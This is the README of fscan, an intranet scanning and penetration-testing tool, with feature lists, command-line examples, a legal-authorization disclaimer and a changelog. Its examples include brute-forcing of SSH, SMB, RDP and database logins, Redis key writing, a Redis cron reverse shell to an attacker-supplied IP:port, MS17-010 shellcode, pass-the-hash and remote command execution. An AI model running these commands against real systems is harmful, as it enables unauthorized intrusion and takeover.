# fscan
[中文][url-doczh]

# 1. Introduction
An intranet comprehensive scanning tool, which is convenient for automatic and omnidirectional missed scanning.
It supports host survival detection, port scanning, explosion of common services, ms17010, Redis batch public key writing, planned task rebound shell, reading win network card information, web fingerprint identification, web vulnerability scanning, netbios detection, domain control identification and other functions.

# 2. Functions
1.Information collection:
* Survival detection(icmp)
* Port scanning

2.Blasting:
* Various service blasting(ssh、smb、rdp, etc.)
* Database password blasting(mysql、mssql、redis、psql、oracle, etc.)  

3.System information, vulnerability scanning:  
* Netbios detection, domain control identification  
* Collect NIC information
* High Risk Vulnerability Scanning(ms17010, etc.)  

4.Web detection:
* Webtitle detection
* Web fingerprinting (cms, oa framework, etc.)
* Web vulnerability scanning (weblogic, st2, etc., also supports xray poc)

5.Exploit:
* Write redis public key and scheduled tasks  
* Excute ssh command  
* Use the ms17017 vulnerability (implanted shellcode), such as adding users, etc. 

6.Others:
* Save ouput result

# 3. Instructions
Getting Started
``` 
fscan.exe -h 192.168.1.1/24
fscan.exe -h 192.168.1.1/16
```

Advanced
```
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(Skip survival detection, do not save output result, skip web poc scanning)
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (Redis write public key)
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (Redis scheduled task rebound shell)
fscan.exe -h 192.168.1.1/24 -c whoami (Execute ssh command)
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (Specify ssh module and port)
fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (Load the specified file and password to blast
fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (Specify the path to save the scan results, which is saved in the current path by default) 
fscan.exe -h 192.168.1.1/8  192.x.x.1 and 192.x.x.254 of segment A, convenient for quickly viewing network segment information )
fscan.exe -h 192.168.1.1/24 -m smb -pwd password (Smb password crash)
fscan.exe -h 192.168.1.1/24 -m ms17010 (Specified ms17010 module)
fscan.exe -hf ip.txt  (Import target from file)
fscan.exe -u http://baidu.com -proxy 8080 (Scan a url and set http proxy http://127.0.0.1:8080)
fscan.exe -h 192.168.1.1/24 -nobr -nopoc (Do not blast, do not scan Web poc, to reduce traffic)
fscan.exe -h 192.168.1.1/24 -pa 3389 (Join 3389->rdp scan)
fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (Proxy only supports simple tcp functions, and libraries with some functions do not support proxy settings)
fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (Built-in functions such as adding users are only applicable to alternative tools, and other special tools for using ms17010 are recommended)
fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (Hash collision)
fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx(Wmiexec module no echo command execution)
```
Compile command
```
go build -ldflags="-s -w " -trimpath main.go
upx -9 fscan.exe (Optional, compressed)
```
Installation for arch users   
`yay -S fscan-git  or paru -S fscan-git`

Full parameters
```
Usage of ./fscan:
  -br int
        Brute threads (default 1)
  -c string
        exec command (ssh|wmiexec)
  -cookie string
        set poc cookie,-cookie rememberMe=login
  -debug int
        every time to LogErr (default 60)
  -dns
        using dnslog poc
  -domain string
        smb domain
  -full
        poc full scan,as: shiro 100 key
  -h string
        IP address of the host you want to scan,for example: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12
  -hash string
        hash
  -hf string
        host file, -hf ip.txt
  -hn string
        the hosts no scan,as: -hn 192.168.1.1/24
  -m string
        Select scan type ,as: -m ssh (default "all")
  -no
        not to save output log
  -nobr
        not to Brute password
  -nopoc
        not to scan web vul
  -np
        not to ping
  -num int
        poc rate (default 20)
  -o string
        Outputfile (default "result.txt")
  -p string
        Select a port,for example: 22 | 1-65535 | 22,80,3306 (default "21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017")
  -pa string
        add port base DefaultPorts,-pa 3389
  -path string
        fcgi、smb romote file path
  -ping
        using ping replace icmp
  -pn string
        the ports no scan,as: -pn 445
  -pocname string
        use the pocs these contain pocname, -pocname weblogic
  -pocpath string
        poc file path
  -portf string
        Port File
  -proxy string
        set poc proxy, -proxy http://127.0.0.1:8080
  -pwd string
        password
  -pwda string
        add a password base DefaultPasses,-pwda password
  -pwdf string
        password file
  -rf string
        redis file to write sshkey file (as: -rf id_rsa.pub) 
  -rs string
        redis shell to write cron file (as: -rs 192.168.1.1:6666) 
  -sc string
        ms17 shellcode,as -sc add
  -silent
        silent scan
  -socks5 string
        set socks5 proxy, will be used in tcp connection, timeout setting will not work
  -sshkey string
        sshkey file (id_rsa)
  -t int
        Thread nums (default 600)
  -time int
        Set timeout (default 3)
  -top int
        show live len top (default 10)
  -u string
        url
  -uf string
        urlfile
  -user string
        username
  -usera string
        add a user base DefaultUsers,-usera user
  -userf string
        username file
  -wmi
        start wmi
  -wt int
        Set web timeout (default 5)
```

# 4. Demo

`fscan.exe -h 192.168.x.x  (Open all functions, ms17010, read network card information)`
![](image/1.png)

![](image/4.png)

`fscan.exe -h 192.168.x.x -rf id_rsa.pub (Redis write public key)`
![](image/2.png)

`fscan.exe -h 192.168.x.x -c "whoami;id" (ssh command)`
![](image/3.png)

`fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 (Support for xray poc)`
![](image/2020-12-12-13-34-44.png)

`fscan.exe -h 192.168.x.x -p 139 (Netbios detection, domain control identification, the [+]DC in the figure below represents domain control)`
![](image/netbios.png)

`go run .\main.go -h 192.168.x.x/24 -m netbios (Show complete netbios information)`
![](image/netbios1.png)

`go run .\main.go -h 192.0.0.0/8 -m icmp(Detect the gateway and several random IPs of each segment C, and count the number of surviving top 10 segments B and C)`
![img.png](image/live.png)

# 5. Disclaimer

This tool is only for **legally authorized** enterprise security construction activities. If you need to test the usability of this tool, please build a target machine environment by yourself.

In order to avoid being used maliciously, all pocs included in this project are theoretical judgments of vulnerabilities, there is no process of exploiting vulnerabilities, and no real attacks and exploits will be launched on the target.

When using this tool for detection, you should ensure that the behavior complies with local laws and regulations, and you have obtained sufficient authorization. **Do not scan unauthorized targets**.

If you have any illegal acts during the use of this tool, you shall bear the corresponding consequences by yourself, and we will not bear any legal and joint liability.

Before installing and using this tool, please **be sure to carefully read and fully understand the content of each clause**. Restrictions, exemption clauses or other clauses involving your major rights and interests may remind you to pay attention in the form of bold, underline, etc. .
Unless you have fully read, fully understood and accepted all the terms of this agreement, please do not install and use this tool. Your use behavior or your acceptance of this agreement in any other express or implied way shall be deemed to have read and agreed to be bound by this agreement.


# 6. 404StarLink 2.0 - Galaxy
![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)

Fscan is the member of 404Team [404StarLink2.0](https://github.com/knownsec/404StarLink2.0-Galaxy)，If you have any questions about fscan or want to find a partner to communicate with, you can adding groups.

- [https://github.com/knownsec/404StarLink2.0-Galaxy#community](https://github.com/knownsec/404StarLink2.0-Galaxy#community)


# 7. Star Chart
[![Stargazers over time](https://starchart.cc/shadow1ng/fscan.svg)](https://starchart.cc/shadow1ng/fscan)

# 8. Donation
 If you think this project is helpful to you, invite the author to have a drink🍹 [click](image/sponsor.png)

# 9. Reference links
https://github.com/Adminisme/ServerScan  
https://github.com/netxfly/x-crack  
https://github.com/hack2fun/Gscan  
https://github.com/k8gege/LadonGo   
https://github.com/jjf012/gopoc


# 10. Dynamics
[+] 2022/11/19 Add hash collision, wmiexec echo free command execution function  
[+] 2022/7/14 Add -hf parameter, support host: port and host/xx: port formats, rule.Search regular matching range is changed from body to header+body, and -nobr no longer includes -nopoc. Optimize webtitle output format.  
[+] 2022/7/6 Add manual gc recycling to try to save useless memory, -Urls support comma separation. Fix a poc module bug- Nobr no longer contains nopoc.  
[+] 2022/7/2 Strengthen the poc fuzzy module to support running backup files, directories, shiro keys (10 keys by default, 100 keys with the -full parameter), etc.Add ms17017 (use parameter: -sc add), which can be used in ms17010 exp Go defines the shell code, and built-in functions such as adding users.  
Add poc and fingerprint. Socks5 proxy is supported. Because the body fingerprint is more complete, the icon icon is no longer running by default.    
[+] 2022/4/20 The poc module adds the specified directory or file -path poc path, the port can specify the file -portf port.txt, the rdp module adds the multi-threaded explosion demo, and -br xx specifies the thread.  
[+] 2022/2/25 Add - m webonly to skip port scanning and directly access http. Thanks @ AgeloVito  
[+] 2022/1/11 Add oracle password explosion.    
[+] 2022/1/7  When scanning IP/8, each C segment gateway and several random IPs will be scanned by default. Recommended parameter: -h ip/8 -m icmp. The LiveTop function is added. When detecting the survival, the number of B and C segment IPs of top10 will be output by default.  
[+] 2021/12/7 Add rdp scanning and port parameter -pa 3389 (the port will be added based on the original port list)  
[+] 2021/12/1 Optimize the xray parsing module, support groups, add poc, add https judgment (tls handshake package), optimize the ip parsing module (support all ip/xx), add the blasting shutdown parameter nobr, add the skip certain ip scanning function -hn 192.168.1.1, add the skip certain port scanning function - pn 21445, and add the scan Docker unauthorized vulnerability.  
[+] 2021/6/18 Improve the poc mechanism. If the fingerprint is identified, the poc will be sent according to the fingerprint information. If the fingerprint is not identified, all poc will be printed once.  
[+] 2021/5/29 Adding the fcgi protocol to execute the scan of unauthorized commands, optimizing the poc module, optimizing the icmp module, and adding the ssh module to the private key connection.  
[+] 2021/5/15 Added win03 version (deleted xray_poc module), added silent scanning mode, added web fingerprint, fixed netbios module array overrun, added a CheckErrs dictionary, and added gzip decoding to webtitle.   
[+] 2021/5/6 Update mod library, poc and fingerprint. Modify thread processing mechanism, netbios detection, domain control identification module, webtitle encoding module, etc.  
[+] 2021/4/22 Modify webtitle module and add gbk decoding.  
[+] 2021/4/21 Add netbios detection and domain control identification functions.    
[+] 2021/3/4 Support -u url and -uf parameters, support batch scan URLs.  
[+] 2021/2/25 Modify the yaml parsing module to support password explosion, such as tomcat weak password. The new sets parameter in yaml is an array, which is used to store passwords. See tomcat-manager-week.yaml for details.  
[+] 2021/2/8 Add fingerprint identification function to identify common CMS and frameworks, such as Zhiyuan OA and Tongda OA.  
[+] 2021/2/5 Modify the icmp packet mode, which is more suitable for large-scale detection.  
Modify the error prompt. If there is no new progress in - debug within 10 seconds, the current progress will be printed every 10 seconds.  
[+] 2020/12/12 The yaml parsing engine has been added to support the poc of xray. By default, all the poc are used (the poc of xray has been filtered). You can use - pocname weblogic, and only one or some poc is used. Need go version 1.16 or above, and can only compile the latest version of go for testing.   
[+] 2020/12/6 Optimize the icmp module and add the -domain parameter (for the smb blasting module, applicable to domain users)   
[+] 2020/12/03 Optimize the ip segment processing module, icmp, port scanning module. 192.168.1.1-192.168.255.255 is supported.   
[+] 2020/11/17 The -ping parameter is added to replace icmp packets with ping in the survival detection module.   
[+] 2020/11/17 WebScan module and shiro simple recognition are added. Skip certificate authentication during https access. Separate the timeout of the service module and the web module, and add the -wt parameter (WebTimeout).    
[+] 2020/11/16 Optimize the icmp module and add the -it parameter (IcmpThreads). The default value is 11000, which is suitable for scanning section B.    
[+] 2020/11/15 Support importt ip from file, -hf ip.txt, and process de duplication ips.  

[url-doczh]: README.md